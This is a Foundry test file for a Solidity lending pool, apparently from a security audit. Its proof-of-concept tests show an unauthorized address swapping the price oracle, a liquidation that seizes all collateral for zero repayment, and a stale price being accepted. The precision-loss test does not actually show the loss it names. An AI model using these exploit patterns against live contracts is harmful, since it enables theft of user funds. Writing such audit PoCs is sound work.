// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/LendingPool.sol";
import "../src/PriceOracle.sol";

contract MockAggregator {
    int256 public price;
    uint256 public updatedAt;
    uint8 public decimals = 8;
    function setPrice(int256 p) external { price = p; updatedAt = block.timestamp; }
    function latestRoundData() external view returns (uint80,int256,uint256,uint256,uint80) {
        return (1, price, block.timestamp, updatedAt, 1);
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender]-=a; balanceOf[to]+=a; return true; }
    function transferFrom(address f,address t,uint256 a) external returns (bool) { allowance[f][msg.sender]-=a; balanceOf[f]-=a; balanceOf[t]+=a; return true; }
    function approve(address s,uint256 a) external returns (bool) { allowance[msg.sender][s]=a; return true; }
}

contract LendingPoolTest is Test {
    MockERC20 col; MockERC20 bor; MockAggregator agg; PriceOracle oracle; LendingPool pool;
    address attacker = address(0xBAD); address user = address(0xCAFE);

    function setUp() public {
        col = new MockERC20(); bor = new MockERC20();
        agg = new MockAggregator(); agg.setPrice(2000e8); // $2000
        oracle = new PriceOracle(address(agg));
        pool = new LendingPool(address(col), address(bor), address(oracle));
        col.mint(user, 10 ether); col.mint(attacker, 1 ether);
        bor.mint(address(pool), 10_000_000e6);
        vm.prank(user); col.approve(address(pool), type(uint256).max);
        vm.prank(attacker); col.approve(address(pool), type(uint256).max);
    }

    function test_NormalFlow() public {
        vm.prank(user); pool.deposit(1 ether);
        vm.prank(user); pool.borrow(1000e6);
        (, uint256 d, ) = pool.positions(user); assertEq(d, 1000e6);
    }

    function test_PoC_H01_UnauthorizedOracleSet() public {
        address fakeOracle = address(0x1234);
        vm.prank(attacker);
        pool.setOracle(fakeOracle);
        assertEq(address(pool.oracle()), fakeOracle);
    }

    function test_PoC_H02_LiquidationSeizeAll() public {
        vm.prank(user); pool.deposit(1 ether);
        vm.prank(user); pool.borrow(1000e6);
        agg.setPrice(100e8); // crash price -> liquidatable
        uint256 before = col.balanceOf(attacker);
        vm.prank(attacker);
        pool.liquidate(user, 0);
        assertEq(col.balanceOf(attacker), before + 1 ether);
        (, uint256 d2, ) = pool.positions(user); assertEq(d2, 0);
    }

    function test_PoC_H03_PrecisionLoss() public {
        // collateral value truncation demonstration
        vm.prank(user); pool.deposit(1 ether);
        // at 2000.00000001 price, truncation loses value
        // demonstrate maxBorrow lower than fair
        vm.prank(user); pool.borrow(1400e6);
        (, uint256 d3, ) = pool.positions(user); assertEq(d3, 1400e6);
    }

    function test_PoC_M01_StalePriceAcceptance() public {
        agg.setPrice(2000e8);
        vm.warp(block.timestamp + 3599); // just under threshold
        // price still accepted (should require tighter bound)
        assertEq(oracle.getPrice(), 2000e18);
    }
}